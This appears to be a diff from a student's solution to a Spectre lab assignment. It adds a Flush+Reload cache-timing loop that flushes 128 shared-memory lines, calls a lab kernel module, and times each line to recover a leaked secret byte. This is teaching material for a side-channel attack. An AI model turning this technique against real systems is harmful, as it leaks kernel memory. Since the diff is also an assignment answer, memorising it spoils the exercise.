@@ -41,7 +41,9 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     size_t current_offset = 0;
 
     printf("Launching attacker\n");
-
+    // clflush(shared_memory);
+    // printf("%lu\n", time_access(shared_memory)); 
+    // printf("%lu\n", time_access(shared_memory)); 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
@@ -49,6 +51,17 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Feel free to create helper methods as necessary.
         // Use "call_kernel_part1" to interact with the kernel module
         // Find the value of leaked_byte for offset "current_offset"
+        for(int j = 0; j < 128; j++) {
+            clflush(shared_memory + 4096 * j);
+        }        
+        call_kernel_part1(kernel_fd, shared_memory, current_offset);    
+        for(int j = 0; j < 128; j++) {
+            if(time_access(shared_memory + 4096 * j) < 100) {
+                leaked_byte = j;
+                break;
+            }
+        }    
+        
         // leaked_byte = ??
 
         leaked_str[current_offset] = leaked_byte;
@@ -62,3 +75,4 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     close(kernel_fd);
     return EXIT_SUCCESS;
 }
+
